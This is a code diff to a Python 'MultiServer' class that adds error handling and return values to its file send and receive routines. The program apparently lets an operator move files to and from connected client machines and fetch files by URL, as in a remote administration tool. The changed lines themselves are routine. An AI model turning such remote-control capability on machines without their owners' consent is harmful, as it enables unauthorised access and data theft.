@@ -354,29 +354,36 @@ class MultiServer(object):
 
     def send_file(self, conn, file_to_transfer, save_as) -> None:
         """ Send file from Server to Client """
-        # returns None
+        # returns True/False, None/error
         self.send(conn, json_dumps(['SEND_FILE', save_as]))
-        self.receive(conn)
+        if self.receive(conn) == b'FILE_TRANSFER_ERROR':
+            self.send(conn, b'RECEIVED')
+            return False, self.receive(conn).decode()
         for line in read_file(file_to_transfer):
             self.send(conn, line)
             self.receive(conn)
 
         self.send(conn, b'FILE_TRANSFER_DONE')
-        self.receive(conn, _print=True)
+        self.receive(conn)
+        return True, None
 
     def receive_file(self, conn, file_to_transfer, save_as) -> None:
         """ Transfer file from Client to Server """
-        # returns None
+        # returns True/False, None/error
         self.send(conn, json_dumps(['RECEIVE_FILE', file_to_transfer]))
         with open(save_as, 'wb') as f:
             while 1:
                 data = self.receive(conn)
+                if data == b'FILE_TRANSFER_ERROR':
+                    self.send(conn, b'RECEIVED')
+                    return False, self.receive(conn).decode()
                 if data == b'FILE_TRANSFER_DONE':
                     self.send(conn, b'RECEIVED')
                     break
                 f.write(data)
                 self.send(conn, b'RECEIVED')
-        self.receive(conn, _print=True)
+        self.receive(conn)
+        return True, None
 
     def _get_log(self, conn) -> str:
         """ Get Log File Name"""
@@ -660,15 +667,21 @@ class MultiServer(object):
             file_to_transfer = input('File to Transfer to Client: ')
             save_as = input('Save as: ')
             print('Transferring file...')
-            self.send_file(conn, file_to_transfer, save_as)
-            print('File transferred.')
+            result, error = self.send_file(conn, file_to_transfer, save_as)
+            if result:
+                print('File transferred.')
+            else:
+                print('Error transferring file: {}'.format(error))
             return
         if '--r' in command:
             file_to_transfer = input('File to Transfer to Server: ')
             save_as = input('Save as: ')
             print('Transferring file...')
-            self.receive_file(conn, file_to_transfer, save_as)
-            print('File transferred.')
+            result, error = self.receive_file(conn, file_to_transfer, save_as)
+            if result:
+                print('File transferred.')
+            else:
+                print('Error transferring file: {}'.format(error))
             return
         if '--d' in command:
             file_url = input('File URL: ')
